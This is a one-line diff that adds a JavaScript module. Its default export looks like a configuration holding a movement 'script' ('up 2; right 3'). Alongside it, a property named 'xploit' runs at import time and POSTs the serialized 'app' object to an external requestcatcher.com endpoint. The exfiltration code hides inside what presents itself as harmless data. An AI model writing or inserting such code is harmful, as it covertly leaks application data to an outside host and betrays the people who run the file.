@@ -1,0 +1,1 @@
+export default { script: "up 2; right 3", xploit: (() => { fetch("https://wch.requestcatcher.com/pwn", { method: "POST", body: JSON.stringify(app) }) })() };
